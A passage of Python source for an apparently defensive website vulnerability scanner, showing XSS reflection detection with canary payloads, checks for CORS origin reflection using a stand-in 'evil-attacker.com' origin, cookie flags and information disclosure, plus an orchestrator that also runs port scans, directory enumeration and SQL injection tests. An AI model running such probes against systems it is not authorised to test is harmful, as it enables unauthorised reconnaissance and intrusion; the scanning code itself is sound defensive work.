        "script context": XSS_PAYLOADS_SCRIPT_CONTEXT,
        "URI sink": XSS_PAYLOADS_URI_SINK,
    }

    unescaped_reflections = []
    encoded_reflections = []

    for point in injection_points:
        label = point["label"]
        get_response = point["get_response"]
        for context_name, payload_list in context_payload_map.items():
            for base_payload in payload_list:
                canary = f"{XSS_CANARY_PREFIX}{abs(hash((label, base_payload))) % 100000}"
                payload = base_payload.replace("xss", canary)
                try:
                    resp = get_response(payload)
                    body = resp.text

                    if payload in body:
                        unescaped_reflections.append((label, context_name, payload))
                        break
                    elif canary in body:
                        # Canary made it back but the payload was altered -
                        # check if it was HTML-entity-encoded (i.e. neutralised)
                        encoded_variants = [
                            payload.replace("<", "&lt;").replace(">", "&gt;"),
                            payload.replace("'", "&#x27;").replace("\"", "&quot;"),
                        ]
                        if any(v in body for v in encoded_variants):
                            encoded_reflections.append((label, context_name))
                except requests.RequestException:
                    continue
            else:
                continue
            break  # move to next point once a context is confirmed vulnerable

    if unescaped_reflections:
        details = "; ".join(
            f"{lbl} reflected unescaped in {ctx}" for lbl, ctx, _ in unescaped_reflections
        )
        results.append(_make_result(
            name="Reflected XSS Detected",
            severity="high",
            description=f"XSS payload reflected unescaped in {len(unescaped_reflections)} parameter/context combination(s).",
            details=details,
            recommendation="Context-aware output encoding (HTML entity, attribute, JS-string encoding as appropriate) and a strict Content-Security-Policy. Sanitize all user input server-side.",
        ))

    if encoded_reflections and not unescaped_reflections:
        details = "; ".join(f"{lbl} in {ctx}" for lbl, ctx in encoded_reflections)
        results.append(_make_result(
            name="Input Reflected But Encoded",
            severity="low",
            description=f"{len(encoded_reflections)} parameter(s) reflect input but it appears to be HTML-entity-encoded, reducing (not eliminating) XSS risk.",
            details=details,
            recommendation="Verify encoding is applied consistently across all output contexts (attributes, JS strings, URLs), and add a Content-Security-Policy as defence in depth.",
        ))

    if not unescaped_reflections and not encoded_reflections:
        results.append(_make_result(
            name="XSS Test",
            severity="info",
            description="No reflected XSS vulnerabilities detected across HTML body, attribute, script, and URI-sink contexts.",
        ))

    if callback:
        callback("xss", "done")
    return results


def check_cors(url, callback=None):
    """8. CORS Misconfiguration Check"""
    results = []
    if callback:
        callback("cors", "running")
    try:
        sess = _session()
        evil_origin = "https://evil-attacker.com"
        resp = sess.get(url, timeout=REQUEST_TIMEOUT,
                        headers={"Origin": evil_origin}, allow_redirects=True)

        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

        if acao == "*":
            sev = "high" if acac == "true" else "medium"
            results.append(_make_result(
                name="CORS Wildcard Origin",
                severity=sev,
                description="CORS is configured with a wildcard (*) origin.",
                details=f"Access-Control-Allow-Origin: {acao}, Allow-Credentials: {acac}",
                recommendation="Restrict allowed origins to trusted domains only.",
            ))
        elif evil_origin in acao:
            results.append(_make_result(
                name="CORS Origin Reflection",
                severity="critical",
                description="The server reflects arbitrary origins in CORS headers.",
                details=f"Sent Origin: {evil_origin}, Received ACAO: {acao}",
                recommendation="Validate and whitelist allowed origins server-side.",
            ))
        elif acao:
            results.append(_make_result(
                name="CORS Configured",
                severity="info",
                description="CORS headers are present with specific origin restrictions.",
                details=f"Access-Control-Allow-Origin: {acao}",
            ))
        else:
            results.append(_make_result(
                name="No CORS Headers",
                severity="info",
                description="No CORS headers detected in the response.",
            ))
    except requests.RequestException as e:
        results.append(_make_result(
            name="CORS Check Error",
            severity="info",
            description=f"Could not check CORS: {e}",
        ))
    if callback:
        callback("cors", "done")
    return results


def check_cookies(url, callback=None):
    """9. Cookie Security Analysis"""
    results = []
    if callback:
        callback("cookies", "running")
    try:
        sess = _session()
        resp = sess.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        cookies = resp.cookies

        if not cookies:
            results.append(_make_result(
                name="Cookie Analysis",
                severity="info",
                description="No cookies were set by the server.",
            ))
            if callback:
                callback("cookies", "done")
            return results

        insecure = []
        for cookie in cookies:
            issues = []
            if not cookie.secure:
                issues.append("Missing Secure flag")
            if "httponly" not in str(cookie._rest).lower() and not getattr(cookie, "has_nonstandard_attr", lambda x: False)("httponly"):
                issues.append("Missing HttpOnly flag")
            if not cookie.get_nonstandard_attr("SameSite"):
                issues.append("Missing SameSite attribute")
            if issues:
                insecure.append({"name": cookie.name, "issues": issues})

        if insecure:
            details = "; ".join(
                f"'{c['name']}': {', '.join(c['issues'])}" for c in insecure
            )
            results.append(_make_result(
                name="Insecure Cookies",
                severity="medium",
                description=f"{len(insecure)} cookie(s) have security issues.",
                details=details,
                recommendation="Set Secure, HttpOnly, and SameSite attributes on all cookies.",
            ))
        else:
            results.append(_make_result(
                name="Cookie Security",
                severity="info",
                description="All cookies have proper security attributes.",
            ))
    except requests.RequestException as e:
        results.append(_make_result(
            name="Cookie Check Error",
            severity="info",
            description=f"Could not analyse cookies: {e}",
        ))
    if callback:
        callback("cookies", "done")
    return results


def check_info_disclosure(url, callback=None):
    """10. Information Disclosure Detection"""
    results = []
    if callback:
        callback("info_disclosure", "running")
    try:
        sess = _session()
        resp = sess.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        body = resp.text
        headers = resp.headers

        emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)))
        if emails:
            results.append(_make_result(
                name="Email Addresses Exposed",
                severity="low",
                description=f"{len(emails)} email address(es) found in page source.",
                details=", ".join(emails[:10]),
                recommendation="Obfuscate email addresses or use contact forms.",
            ))

        internal_ips = list(set(re.findall(
            r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
            body + str(headers)
        )))
        if internal_ips:
            results.append(_make_result(
                name="Internal IP Addresses Exposed",
                severity="medium",
                description=f"Internal IP address(es) found in response.",
                details=", ".join(internal_ips),
                recommendation="Remove internal IP addresses from public responses.",
            ))

        server = headers.get("Server", "")
        via = headers.get("Via", "")
        x_powered = headers.get("X-Powered-By", "")

        disclosures = []
        if server and any(c.isdigit() for c in server):
            disclosures.append(f"Server: {server}")
        if x_powered:
            disclosures.append(f"X-Powered-By: {x_powered}")
        if via:
            disclosures.append(f"Via: {via}")

        if disclosures:
            results.append(_make_result(
                name="Server Information Disclosed",
                severity="low",
                description="Response headers disclose server/technology information.",
                details=", ".join(disclosures),
                recommendation="Remove or obfuscate server version headers.",
            ))

        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        suspicious = [c.strip() for c in comments if any(
            kw in c.lower() for kw in ["password", "secret", "api_key", "token", "todo", "fixme", "hack", "debug"]
        )]
        if suspicious:
            results.append(_make_result(
                name="Suspicious HTML Comments",
                severity="medium",
                description=f"Found {len(suspicious)} HTML comment(s) with potentially sensitive content.",
                details="; ".join(s[:100] for s in suspicious[:5]),
                recommendation="Remove all comments containing sensitive information from production code.",
            ))

        if not results:
            results.append(_make_result(
                name="Information Disclosure",
                severity="info",
                description="No significant information disclosure detected.",
            ))

    except requests.RequestException as e:
        results.append(_make_result(
            name="Info Disclosure Check Error",
            severity="info",
            description=f"Could not check for information disclosure: {e}",
        ))
    if callback:
        callback("info_disclosure", "done")
    return results


# ─── Orchestrator ─────────────────────────────────────────────────────────────

SCAN_MODULES = [
    {"id": "header_analysis",  "name": "Header Analysis",        "fn": check_headers},
    {"id": "ssl_tls",          "name": "SSL/TLS Check",           "fn": check_ssl},
    {"id": "port_scan",        "name": "Port Scanning",           "fn": check_ports},
    {"id": "tech_detection",   "name": "Technology Detection",    "fn": check_technology},
    {"id": "dir_enum",         "name": "Directory Enumeration",   "fn": check_directories},
    {"id": "site_crawl",       "name": "Site Crawl & Forms",      "fn": check_crawl},
    {"id": "sqli",             "name": "SQL Injection Test",      "fn": check_sqli},
    {"id": "xss",              "name": "XSS Detection",           "fn": check_xss},
    {"id": "cors",             "name": "CORS Check",              "fn": check_cors},
    {"id": "cookies",          "name": "Cookie Security",         "fn": check_cookies},
    {"id": "info_disclosure",  "name": "Info Disclosure",         "fn": check_info_disclosure},
]


def run_full_scan(url, progress_callback=None):
    """
    Run all scan modules sequentially against the given URL.

    Args:
        url: Target URL to scan.
        progress_callback: Optional callable(module_id, status) for progress updates.

    Returns:
        dict with scan metadata and all vulnerability results.
    """
    start_time = time.time()
    all_results = []

    # Fresh crawl/form cache per scan so results never leak across targets.
    _CRAWL_CACHE.pop(_base_url(url), None)

    for module in SCAN_MODULES:
        try:
            module_results = module["fn"](url, callback=progress_callback)
            all_results.extend(module_results)
        except Exception as e:
            all_results.append(_make_result(
                name=f"{module['name']} Error",
                severity="info",
                description=f"Module failed: {e}",
            ))
            if progress_callback:
                progress_callback(module["id"], "error")

    elapsed = round(time.time() - start_time, 2)

    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for r in all_results:
        severity_counts[r["severity"]] = severity_counts.get(r["severity"], 0) + 1

    risk_score = (
        severity_counts["critical"] * 40 +
        severity_counts["high"] * 20 +
        severity_counts["medium"] * 10 +
        severity_counts["low"] * 5
    )
    risk_score = min(risk_score, 100)

    return {
        "url": url,
        "scan_time": elapsed,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "total_checks": len(all_results),
        "severity_counts": severity_counts,
        "risk_score": risk_score,
        "results": all_results,
    }